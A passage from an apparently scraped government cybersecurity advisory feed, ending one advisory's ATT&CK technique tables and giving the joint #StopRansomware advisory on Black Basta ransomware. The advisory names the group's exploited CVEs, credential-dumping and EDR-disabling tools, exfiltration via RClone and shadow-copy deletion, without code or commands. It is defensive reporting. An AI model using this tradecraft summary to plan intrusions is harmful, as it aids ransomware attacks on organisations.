<td>Account Manipulation [T1098]</td>
<td>Valid Accounts: Cloud Accounts [T1078.004]</td>
</tr>
<tr>
<td>Valid Accounts: Domain Accounts [T1078.002]</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Privilege Escalation (TA0004)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Scheduled Task/Job: At [T1053.002]&nbsp;</td>
<td>Create or Modify System Process: Windows Service [T1543.003]&nbsp;</td>
</tr>
<tr>
<td>Scheduled Task/Job: Scheduled Task [T1053.005] &nbsp;</td>
<td>Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder [T1547.001]&nbsp;</td>
</tr>
<tr>
<td>Process Injection: Thread Execution Hijacking [T1055.003]&nbsp;</td>
<td>Boot or Logon Autostart Execution: Shortcut Modification [T1547.009]&nbsp;</td>
</tr>
<tr>
<td>Process Injection: Process Hollowing [T1055.012]</td>
<td>Hijack Execution Flow: DLL Search Order Hijacking [T1574.001]</td>
</tr>
<tr>
<td>Valid Accounts: Domain Accounts [T1078.002]</td>
<td>Exploitation for Privilege Escalation [T1068]</td>
</tr>
<tr>
<td>Access Token Manipulation: Token Impersonation/Theft [T1134.001]</td>
<td>Event Triggered Execution: Unix Shell Configuration Modification [T1546.004]</td>
</tr>
<tr>
<td>Process Injection: Dynamic-link Library Injection [T1055.001]</td>
<td>Valid Accounts: Domain Accounts [T1078.002]</td>
</tr>
<tr>
<td>Valid Accounts: Local Accounts [T1078.003]</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Defense Evasion (TA0005)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Rootkit [T1014]&nbsp;</td>
<td>Indirect Command Execution [T1202]&nbsp;</td>
</tr>
<tr>
<td>Obfuscated Files or Information [T1027] &nbsp;</td>
<td>System Binary Proxy Execution: Mshta [T1218.005]&nbsp;</td>
</tr>
<tr>
<td>Obfuscated Files or Information: Software Packing [T1027.002]&nbsp;</td>
<td>System Binary Proxy Execution: Regsvr32 [T1218.010]&nbsp;</td>
</tr>
<tr>
<td>Obfuscated Files or Information: Steganography [T1027.003]&nbsp;</td>
<td>Subvert Trust Controls: Code Signing [T1553.002]&nbsp;</td>
</tr>
<tr>
<td>Obfuscated Files or Information: Compile After Delivery [T1027.004]&nbsp;</td>
<td>File and Directory Permissions Modifications: Linux and Mac File and Directory Permissions Modification [T1222.002] &nbsp;</td>
</tr>
<tr>
<td>Masquerading: Match Legitimate Name or Location [T1036.005]&nbsp;</td>
<td>Virtualisation/Sandbox Evasion: System Checks [T1497.001]&nbsp;</td>
</tr>
<tr>
<td>Process Injection: Thread Execution Hijacking [T1055.003]</td>
<td>Masquerading [T1036]</td>
</tr>
<tr>
<td>Reflective Code Loading [T1620]</td>
<td>Impair Defences: Disable or Modify System Firewall [T1562.004]&nbsp;</td>
</tr>
<tr>
<td>Process Injection: Process Hollowing [T1055.012]&nbsp;</td>
<td>Hide Artifacts: Hidden Files and Directories [T1564.001]&nbsp;</td>
</tr>
<tr>
<td>Indicator Removal: File Deletion [T1070.004] &nbsp;</td>
<td>Hide Artifacts: Hidden Window [T1564.003] &nbsp;</td>
</tr>
<tr>
<td>Indicator Removal: Timestomp [T1070.006] &nbsp;</td>
<td>Hijack Execution Flow: DLL Search Order Hijacking [T1574.001]&nbsp;</td>
</tr>
<tr>
<td>Indicator Removal: Clear Windows Event Logs [T1070.001]</td>
<td>Hijack Execution Flow: DLL Side-Loading [T1574.002]&nbsp;</td>
</tr>
<tr>
<td>Modify Registry [T1112]&nbsp;</td>
<td>Web Service [T1102]&nbsp;</td>
</tr>
<tr>
<td>Deobfuscate/Decode Files or Information [T1140]&nbsp;</td>
<td>Masquerading: Masquerade Task or Service [T1036.004]</td>
</tr>
<tr>
<td>Impair Defenses [T1562]</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Credential Access (TA0006)</th>
</tr>
</thead>
<tbody>
<tr>
<td>OS Credential Dumping: LSASS Memory [T1003.001] &nbsp;</td>
<td>Unsecured Credentials: Credentials in Files [T1552.001]</td>
</tr>
<tr>
<td>OS Credential Dumping: NTDS [T1003.003] &nbsp;</td>
<td>Brute Force: Password Guessing [T1110.001]</td>
</tr>
<tr>
<td>Network Sniffing [T1040]&nbsp;</td>
<td>Forced Authentication [T1187]</td>
</tr>
<tr>
<td>Credentials from Password Stores: Keychain [T1555.001]</td>
<td>Steal or Forge Kerberos Tickets: Kerberoasting [T1558.003]&nbsp;</td>
</tr>
<tr>
<td>Input Capture: Keylogging [T1056.001]&nbsp;</td>
<td>Multi-Factor Authentication Interception [T1111]</td>
</tr>
<tr>
<td>Steal Web Session Cookie [T1539]&nbsp;</td>
<td>Steal Application Access Token [T1528]</td>
</tr>
<tr>
<td>Exploitation for Credential Access [T1212]</td>
<td>Brute Force: Password Cracking [T1110.002]</td>
</tr>
<tr>
<td>Input Capture: Web Portal Capture [T1056.003]</td>
<td>OS Credential Dumping: DCSync [T1003.006]</td>
</tr>
<tr>
<td>Credentials from Password Stores [T1555]&nbsp;</td>
<td>Credentials from Password Stores: Credentials from Web Browsers [T1555.003]</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Discovery (TA0007)</th>
</tr>
</thead>
<tbody>
<tr>
<td>System Service Discovery [T1007]&nbsp;</td>
<td>System Information Discovery [T1082] &nbsp;</td>
</tr>
<tr>
<td>Application Window Discovery [T1010] &nbsp;</td>
<td>Account Discovery: Local Account [T1087.001] &nbsp;</td>
</tr>
<tr>
<td>Query Registry [T1012]&nbsp;</td>
<td>System Information Discovery, Technique T1082 - Enterprise | MITRE ATT&amp;CK®</td>
</tr>
<tr>
<td>File and Directory Discovery [T1083]</td>
<td>System Time Discovery [T1124]&nbsp;</td>
</tr>
<tr>
<td>Network Service Discovery [T1046]&nbsp;</td>
<td>System Owner/User Discovery [T1033]&nbsp;</td>
</tr>
<tr>
<td>Remote System Discovery [T1018]&nbsp;</td>
<td>Domain Trust Discovery [T1482]&nbsp;</td>
</tr>
<tr>
<td>Account Discovery: Email Account [T1087.003]</td>
<td>Account Discovery: Domain Account [T1087.002]</td>
</tr>
<tr>
<td>System Network Connections Discovery [T1049]&nbsp;</td>
<td>Virtualisation/Sandbox Evasion: System Checks [T1497.001]&nbsp;</td>
</tr>
<tr>
<td>Process Discovery [T1057]&nbsp;</td>
<td>Software Discovery [T1518]&nbsp;</td>
</tr>
<tr>
<td>Permission Groups Discovery: Domain Groups [T1069.002]&nbsp;</td>
<td>Network Share Discovery, Technique T1135 - Enterprise | MITRE ATT&amp;CK®</td>
</tr>
<tr>
<td>System Network Configuration Discovery: Internet Connection Discovery [T1016.001]</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Lateral Movement (TA0008)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Services: Remote Desktop Protocol [T1021.001]&nbsp;</td>
<td>Remote Services [T1021]</td>
</tr>
<tr>
<td>Remote Services: SMB/Windows Admin Shares [T1021.002]&nbsp;</td>
<td>Use Alternate Authentication Material: Pass the Ticket [T1550.003]</td>
</tr>
<tr>
<td>Remote Services: Windows Remote Management [T1021.006]&nbsp;</td>
<td>Lateral Tool Transfer [T1570]&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Collection (TA0009)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Data from Local System [T1005]&nbsp;</td>
<td>Archive Collected Data: Archive via Library [T1560.002]</td>
</tr>
<tr>
<td>Data from Network Shared Drive [T1039] &nbsp;</td>
<td>Email Collection: Remote Email Collection [T1114.002]&nbsp;</td>
</tr>
<tr>
<td>Input Capture: Keylogging [T1056.001]&nbsp;</td>
<td>Clipboard Data [T1115]&nbsp;</td>
</tr>
<tr>
<td>Automated Collection [T1119]</td>
<td>Data from Information Repositories [T1213]</td>
</tr>
<tr>
<td>Input Capture: Web Portal Capture [T1056.003]</td>
<td>Data Staged: Remote Data Staging [T1074.002]&nbsp;</td>
</tr>
<tr>
<td>Data Staged: Local Data Staging [T1074.001]&nbsp;</td>
<td>Archive Collected Data [T1560]</td>
</tr>
<tr>
<td>Email Collection [T1114]</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Exfiltration (TA0010)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exfiltration Over C2 Channel [T1041] &nbsp;</td>
<td>Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol [T1048.002]</td>
</tr>
<tr>
<td>Exfiltration Over Alternative Protocol [T1048]&nbsp;</td>
<td>Exfiltration Over Web Service: Exfiltration to Cloud Storage [T1567.002]</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Command and Control (TA0011)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Data Obfuscation: Protocol Impersonation [T1001.003]&nbsp;</td>
<td>Web Service: Dead Drop Resolver [T1102.001] &nbsp;</td>
</tr>
<tr>
<td>Commonly Used Port [T1043]&nbsp;</td>
<td>Web Service: One-way Communication [T1102.003]</td>
</tr>
<tr>
<td>Application Layer Protocol: Web Protocols [T1071.001]&nbsp;</td>
<td>Ingress Tool Transfer [T1105]&nbsp;</td>
</tr>
<tr>
<td>Application Layer Protocol: File Transfer Protocols [T1071.002]</td>
<td>Proxy: Internal Proxy [T1090.001]</td>
</tr>
<tr>
<td>Proxy: External Proxy [T1090.002]&nbsp;</td>
<td>Non-Standard Port [T1571]&nbsp;</td>
</tr>
<tr>
<td>Proxy: Multi-hop Proxy [T1090.003]&nbsp;</td>
<td>Protocol Tunnelling [T1572]&nbsp;</td>
</tr>
<tr>
<td>Web Service: Bidirectional Communication [T1102.002]&nbsp;</td>
<td>Encrypted Channel [T1573]&nbsp;</td>
</tr>
<tr>
<td>Encrypted Channel: Asymmetric Cryptography [T1573.002]</td>
<td>Ingress Tool Transfer [T1105]</td>
</tr>
<tr>
<td>Proxy, Technique T1090 - Enterprise | MITRE ATT&amp;CK®</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Impact (TA0040)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Service Stop [T1489]&nbsp;</td>
<td>Disk Wipe [T1561]</td>
</tr>
<tr>
<td>System Shutdown/Reboot [T1529]&nbsp;</td>
<td>Resource Hijacking [T1496]&nbsp;</td>
</tr>
</tbody>
</table>
<h2><strong>Notes</strong></h2>
<div>
<p>[1]&nbsp;U.S. Department of Justice. 2021.&nbsp;<a href=\"https://www.justice.gov/opa/pr/four-chinese-nationals-working-ministry-state-security-charged-global-computer-intrusion\" title=\"Four Chinese Nationals Working with the Ministry of State Security Charged with Global Computer Intrusion Campaign Targeting Intellectual Property and Confidential Business Information, Including Infectious Disease Research\">Four Chinese Nationals Working with the Ministry of State Security Charged with Global Computer Intrusion Campaign Targeting Intellectual Property and Confidential Business Information, Including Infectious Disease Research.</a><br>[2] In this context, an endpoint is a function of the web application.<br>[3] Service accounts are not tied to individual users, but rather to services. In a Microsoft corporate domain, there are various kinds of accounts.<br>[4] Mounting shares is the process of making files on a file system structure accessible to a user or user group.</p>
</div>
</div>
<p>&nbsp;</p>
") (pubDate nil "Mon, 08 Jul 2024 09:52:05 EDT") (creator nil "CISA") (guid ((isPermaLink . "false")) "/node/21723"))) ("#StopRansomware: Black Basta" "<h3><strong>SUMMARY</strong></h3>
<p><em><strong>Note</strong>: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit&nbsp;</em><a href=\"https://www.cisa.gov/stopransomware\" title=\"#StopRansomware\"><em>stopransomware.gov</em></a><em> to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.</em></p>
<p>The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), Department of Health and Human Services (HHS), and Multi-State Information Sharing and Analysis Center (MS-ISAC) (hereafter referred to as the authoring organizations)&nbsp;are releasing this joint CSA to provide information on Black Basta, a ransomware variant whose actors have encrypted and stolen data from at least 12 out of 16 critical infrastructure sectors, including the Healthcare and Public Health (HPH) Sector.</p>
<p>This joint CSA provides TTPs and IOCs obtained from FBI investigations and third-party reporting. Black Basta is considered a ransomware-as-a-service (RaaS) variant and was first identified in April 2022.&nbsp;Black Basta affiliates have impacted a wide range of businesses and critical infrastructure in North America, Europe, and Australia. As of May 2024, Black Basta affiliates have impacted over 500 organizations globally.</p>
<p>Black Basta affiliates use common initial access techniques—such as phishing and exploiting known vulnerabilities—and then employ a double-extortion model, both encrypting systems and exfiltrating data. Ransom notes do not generally include an initial ransom demand or payment instructions. Instead, the notes provide victims with a unique code and instructs them to contact the ransomware group via a&nbsp;<code>.onion</code> URL (reachable through the Tor browser). Typically, the ransom notes give victims between 10 and 12 days to pay the ransom before the ransomware group publishes their data on the Black Basta TOR site, Basta News.</p>
<p>Healthcare organizations are attractive targets for cybercrime actors due to their size, technological dependence, access to personal health information, and unique impacts from patient care disruptions. The authoring organizations urge HPH Sector and all critical infrastructure organizations to apply the recommendations in the&nbsp;Mitigations section of this CSA to reduce the likelihood of compromise from Black Basta and other ransomware attacks. Victims of ransomware should report the incident to their local FBI field office or CISA (see the Reporting section for contact information).</p>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-07/aa24-131a-joint-csa-stopransomware-black-basta_2.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-131A #StopRansomware: Black Basta</a>
    <span class=\"c-file__size\">(PDF,       613.62 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-08/aa24-131a-joint-csa-stopransomware-black-basta_1_ES.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-131A #StopRansomware: Black Basta - Spanish Translation</a>
    <span class=\"c-file__size\">(PDF,       621.68 KB
  )</span>
  </div>
</div>
<p>For a downloadable copy of IOCs, see:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-05/AA24-131A.stix_.xml\" class=\"c-file__link\" target=\"_blank\">AA24-131A STIX XML</a>
    <span class=\"c-file__size\">(XML,       237.45 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-05/AA24-131A-StopRansomware-Black-Basta.stix_.json\" class=\"c-file__link\" target=\"_blank\">AA24-131A STIX JSON</a>
    <span class=\"c-file__size\">(JSON,       180.78 KB
  )</span>
  </div>
</div>
<h3><strong>TECHNICAL DETAILS</strong></h3>
<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK for Enterprise</a> framework, version 15. See the MITRE ATT&amp;CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.</p>
<h4><strong>Initial Access</strong></h4>
<p>Black Basta affiliates primarily use spearphishing [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1566/001/\" title=\"Phishing: Spearphishing Attachment\">T1566</a>] to obtain initial access. According to cybersecurity researchers, affiliates have also used <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-242a\" title=\"Identification and Disruption of QakBot Infrastructure\">Qakbot</a> during initial access.[<a href=\"https://www.sentinelone.com/labs/black-basta-ransomware-attacks-deploy-custom-edr-evasion-tools-tied-to-fin7-threat-actor/\" title=\"Black Basta Ransomware | Attacks Deploy Custom EDR Evasion Tools Tied to FIN7 Threat Actor\">1</a>]</p>
<p>Starting in February 2024, Black Basta affiliates began exploiting ConnectWise vulnerability <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1709\" title=\"CVE-2024-1709\">CVE-2024-1709</a> [<a href=\"https://cwe.mitre.org/data/definitions/288.html\" title=\"CWE-288: Authentication Bypass Using an Alternate Path or Channel\">CWE-288</a>] [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a>]. In some instances, affiliates have been observed abusing valid credentials [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/\" title=\"Valid Accounts\">T1078</a>].</p>
<h4><strong>Discovery and Execution</strong></h4>
<p>Black Basta affiliates use tools such as SoftPerfect network scanner (<code>netscan.exe</code>) to conduct network scanning. Cybersecurity researchers have observed affiliates conducting reconnaissance using utilities with innocuous file names such as <code>Intel</code> or <code>Dell</code>, left in the root drive <code>C:\\</code> [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1036/\" title=\"Masquerading\">T1036</a>].[<a href=\"https://www.sentinelone.com/labs/black-basta-ransomware-attacks-deploy-custom-edr-evasion-tools-tied-to-fin7-threat-actor/\" title=\"Black Basta Ransomware | Attacks Deploy Custom EDR Evasion Tools Tied to FIN7 Threat Actor\">1</a>]</p>
<h4><strong>Lateral Movement</strong></h4>
<p>Black Basta affiliates use tools such as BITSAdmin and PsExec, along with Remote Desktop Protocol (RDP), for lateral movement. Some affiliates also use tools like Splashtop, Screen Connect, and Cobalt Strike beacons to assist with remote access and lateral movement.</p>
<h4><strong>Privilege Escalation and Lateral Movement</strong></h4>
<p>Black Basta affiliates use credential scraping tools like Mimikatz for privilege escalation. According to cybersecurity researchers, Black Basta affiliates have also exploited ZeroLogon (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-1472\" title=\"CVE-2020-1472\">CVE-2020-1472</a>, [<a href=\"https://cwe.mitre.org/data/definitions/330.html\" title=\"CWE-330: Use of Insufficiently Random Values\">CWE-330</a>]), NoPac (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-42278\" title=\"CVE-2021-42278\">CVE-2021-42278</a> [<a href=\"https://cwe.mitre.org/data/definitions/20.html\" title=\"CWE-20: Improper Input Validation\">CWE-20</a>] and <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-42287\" title=\"CVE-2021-42287\">CVE-2021-42287</a> [<a href=\"https://cwe.mitre.org/data/definitions/269.html\" title=\"CWE-269: Improper Privilege Management\">CWE-269</a>]), and PrintNightmare (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-34527\" title=\"CVE-2021-34527\">CVE-2021-34527</a>, [<a href=\"https://cwe.mitre.org/data/definitions/269.html\" title=\"CWE-269: Improper Privilege Management\">CWE-269</a>]) vulnerabilities for local and Windows Active Domain privilege escalation [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1068/\" title=\"Exploitation for Privilege Escalation\">T1068</a>].[<a href=\"https://www.sentinelone.com/labs/black-basta-ransomware-attacks-deploy-custom-edr-evasion-tools-tied-to-fin7-threat-actor/\" title=\"Black Basta Ransomware | Attacks Deploy Custom EDR Evasion Tools Tied to FIN7 Threat Actor\">1</a>],[<a href=\"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-blackbasta\" title=\"Ransomware Spotlight: Black Basta\">2</a>]</p>
<h4><strong>Exfiltration and Encryption</strong></h4>
<p>Black Basta affiliates use RClone to facilitate data exfiltration prior to encryption. Prior to exfiltration,&nbsp;cybersecurity researchers have observed Black Basta affiliates using PowerShell [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a>] to disable antivirus products, and in some instances, deploying a tool called Backstab, designed to disable endpoint detection and response (EDR) tooling [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a>].[<a href=\"https://www.kroll.com/en/insights/publications/cyber/black-basta-technical-analysis\" title=\"Black Basta - Technical Analysis\">3</a>] Once antivirus programs are terminated, a ChaCha20 algorithm with an RSA-4096 public key fully encrypts files [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a>]. A&nbsp;<code>.basta</code> or otherwise random file extension is added to file names and a ransom note titled&nbsp;<code>readme.txt</code> is left on the compromised system.[<a href=\"https://www.blackberry.com/us/en/solutions/endpoint-security/ransomware-protection/black-basta\" title=\"Who Is Black Basta?\">4</a>] To further inhibit system recovery, affiliates use the&nbsp;<code>vssadmin.exe</code> program to delete volume shadow copies [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1490/\" title=\"Inhibit System Recovery\">T1490</a>].[<a href=\"https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/\" title=\"Threat Assessment: Black Basta Ransomware\">5</a>]</p>
<h4><strong>Leveraged Tools</strong></h4>
<p>See&nbsp;Table 1 for publicly available tools and applications&nbsp;used by Black Basta affiliates. This includes legitimate tools repurposed for their operations.</p>
<p><strong>Disclaimer:</strong> Use of these tools and applications should not be attributed as malicious without analytical evidence to support threat actor use and/or control.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 1: Tools Used by Black Basta Affiliates</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Tool Name</strong></th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>BITSAdmin</td>
<td>A command-line utility that manages downloads/uploads between a client and server by using the Background Intelligent Transfer Service (BITS) to perform asynchronous file transfers.</td>
</tr>
<tr>
<td>Cobalt Strike</td>
<td>A penetration testing tool used by security professions to test the security of networks and systems. Black Basta affiliates have used it to assist with lateral movement and file execution.</td>
</tr>
<tr>
<td>Mimikatz</td>
<td>A tool that allows users to view and save authentication credentials such as Kerberos tickets. Black Basta affiliates have used it to aid in privilege escalation.</td>
</tr>
<tr>
<td>PSExec</td>
<td>A tool designed to run programs and execute commands on remote systems.</td>
</tr>
<tr>
<td>PowerShell</td>
<td>A cross-platform task automation solution made up of a command-line shell, a scripting language, and a configuration management framework, which runs on Windows, Linux, and macOS.</td>
</tr>
<tr>
<td>RClone</td>
<td>A command line program used to sync files with cloud storage services such as Mega.</td>
</tr>
<tr>
<td>SoftPerfect</td>
<td>A network scanner (<code>netscan.exe</code>) used to ping computers, scan ports, discover shared folders, and retrieve information about network devices via Windows Management Instrumentation (WMI), Simple Network Management Protocol (SNMP), HTTP, Secure Shell (SSH) and PowerShell. It also scans for remote services, registry, files, and performance counters.&nbsp;</td>
</tr>
<tr>
<td>ScreenConnect</td>
<td>Remote support, access, and meeting software that allows users to control devices remotely over the internet.</td>
</tr>
<tr>
<td>Splashtop</td>
<td>Remote desktop software that allows remote access to devices for support, access, and collaboration.</td>
</tr>
<tr>
<td>WinSCP</td>
<td>Windows Secure Copy is a free and open source SSH File Transfer Protocol, File Transfer Protocol, WebDAV, Amazon S3, and secure copy protocol client. Black Basta affiliates have used it to transfer data from a compromised network to actor-controlled accounts.</td>
</tr>
</tbody>
</table>
<h3><strong>MITRE ATT&amp;CK TACTICS AND TECHNIQUES</strong></h3>
<p>See Tables 2–6&nbsp;for all referenced threat actor tactics and techniques in this advisory.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 2: Black Basta ATT&amp;CK Techniques for Initial Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Phishing</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1566/\" title=\"Phishing\">T1566</a></td>
<td>Black Basta affiliates have used spearphishing emails to obtain initial access.</td>
</tr>
<tr>
<td>Exploit Public-Facing Application</td>
<td><a href=\"https://attack.mitre.org/versions/v12/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a></td>
<td>Black Basta affiliates have exploited ConnectWise vulnerability <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1709\" title=\"CVE-2024-1709\">CVE-2024-1709</a> to obtain initial access.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 3: Black Basta ATT&amp;CK Techniques for Privilege Escalation</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Exploitation for Privilege Escalation</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1068/\" title=\"Exploitation for Privilege Escalation\">T1068</a></td>
<td>Black Basta affiliates have used credential scraping tools like Mimikatz, Zerologon, NoPac and PrintNightmare for privilege escalation.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4: Black Basta ATT&amp;CK Techniques for Defense Evasion</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Masquerading</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1036/\" title=\"Masquerading\">T1036</a></td>
<td>Black Basta affiliates have conducted reconnaissance using utilities with innocuous file names, such as <code>Intel</code> or <code>Dell</code>, to evade detection.</td>
</tr>
<tr>
<td>Impair Defenses: Disable or Modify Tools</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a></td>
<td>
<p>Black Basta affiliates have deployed a tool called Backstab to disable endpoint detection and response (EDR) tooling.</p>
<p>Black Basta affiliates have used PowerShell to disable antivirus products.</p>
</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5: Black Basta ATT&amp;CK Techniques for Execution</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting Interpreter: PowerShell</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a></td>
<td>Black Basta affiliates have used PowerShell to disable antivirus products.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6: Black Basta ATT&amp;CK Techniques for Impact</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Inhibit System Recovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1490/\" title=\"Inhibit System Recovery\">T1490</a></td>
<td>Black Basta affiliates have used the vssadmin.exe program to delete shadow copies.&nbsp;</td>
</tr>
<tr>
<td>Data Encrypted for Impact</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a></td>
<td>Black Basta affiliates have used a public key to fully encrypt files.&nbsp;</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
</div>
</div>
</div>
</div>
